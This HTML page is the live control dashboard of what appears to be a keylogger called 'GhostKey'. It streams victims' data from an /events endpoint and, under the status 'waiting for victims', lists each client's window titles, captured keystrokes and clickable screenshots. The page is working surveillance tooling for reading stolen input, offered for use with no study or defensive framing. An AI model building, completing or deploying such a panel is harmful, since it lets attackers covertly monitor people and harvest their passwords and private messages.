<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>GhostKey Live Dashboard — Futuristic</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;800&display=swap');

  body {
    background: radial-gradient(circle at center, #020202 0%, #000 70%, #030303 100%);
    color: #00ffea;
    font-family: 'Orbitron', monospace;
    margin: 0;
    padding: 30px;
  }

  h1 {
    font-size: 2.4em;
    text-shadow: 0 0 12px #00ffee;
    margin: 0 0 25px;
    display: flex;
    align-items: center;
    gap: 12px;
  }

  .dot {
    width: 14px;
    height: 14px;
    background: #00ffee;
    border-radius: 50%;
    box-shadow: 0 0 15px #00ffee;
    animation: pulse 1.5s infinite;
  }

  @keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.3; }
  }

  .status {
    margin: 15px 0;
    font-size: 1.3em;
    letter-spacing: 1px;
    text-shadow: 0 0 8px currentColor;
  }

  .ok { color: #00ffea; }
  .error { color: #ff4d4d; text-shadow: 0 0 10px #ff4d4d; }

  table {
    width: 100%;
    border-collapse: collapse;
    margin-top: 20px;
    backdrop-filter: blur(6px);
    background: rgba(0, 255, 234, 0.05);
    border: 1px solid rgba(0, 255, 234, 0.15);
    border-radius: 10px;
    overflow: hidden;
  }

  th {
    background: rgba(0, 255, 234, 0.1);
    padding: 12px;
    text-align: left;
    font-weight: 600;
    border-bottom: 1px solid rgba(0, 255, 234, 0.15);
  }

  td {
    padding: 10px;
    border-bottom: 1px solid rgba(0, 255, 234, 0.08);
  }

  tr:hover {
    background: rgba(0, 255, 234, 0.07);
    transition: 0.2s;
  }

  .ss {
    width: 180px;
    height: 100px;
    object-fit: cover;
    cursor: pointer;
    border: 2px solid rgba(0, 255, 234, 0.3);
    border-radius: 8px;
    transition: 0.25s;
  }

  .ss:hover {
    transform: scale(1.05);
    border-color: #00ffee;
    box-shadow: 0 0 10px #00ffee;
  }

  .modal {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.95);
    justify-content: center;
    align-items: center;
    z-index: 999;
  }

  .modal img {
    max-width: 95%;
    max-height: 95vh;
    border-radius: 14px;
    box-shadow: 0 0 25px #00ffee;
  }
</style>
</head>
<body>
<h1><span class="dot"></span> GhostKey Live Dashboard</h1>
<div class="status ok" id="status">Starting connection...</div>

<table id="logtable" style="display:none">
  <thead>
    <tr>
      <th>#</th>
      <th>Time</th>
      <th>Client</th>
      <th>Window</th>
      <th>Keys</th>
      <th>Screenshot</th>
    </tr>
  </thead>
  <tbody id="logs"></tbody>
</table>

<div id="modal" class="modal" onclick="this.style.display='none'">
  <img id="big">
</div>

<script>
let counter = 1;
const tbody = document.getElementById("logs");
const table = document.getElementById("logtable");
const status = document.getElementById("status");

function connect() {
  status.textContent = "Connecting to server...";
  status.className = "status";

  const es = new EventSource("/events");

  es.onopen = () => {
    status.textContent = "Connected — waiting for victims...";
    status.className = "status ok";
    table.style.display = "table";
  };

  es.onmessage = (e) => {
    if (e.data.trim() === "" || e.data.startsWith(":")) return;
    try {
      const d = JSON.parse(e.data);
      const row = document.createElement("tr");
      const ts = new Date().toISOString().slice(0,19).replace("T"," ");

      row.innerHTML = `
        <td>${counter++}</td>
        <td>${ts}</td>
        <td><b>${d.Client || "?"}</b></td>
        <td>${d.Window || "Desktop"}</td>
        <td>${(d.Keys || []).join("").substring(0,150)}${(d.Keys || []).length > 150 ? "..." : ""}</td>
        <td>${d.Screenshot
          ? `<img class='ss' src='${d.Screenshot}' onclick="document.getElementById('big').src=this.src;document.getElementById('modal').style.display='flex'">`
          : "—"}
        </td>
      `;

      tbody.insertBefore(row, tbody.firstChild);
    } catch (e) {}
  };

  es.onerror = () => {
    es.close();
    status.textContent = "Connection lost — retrying in 3s...";
    status.className = "status error";
    setTimeout(connect, 3000);
  };
}

connect();
</script>
</body>
</html>
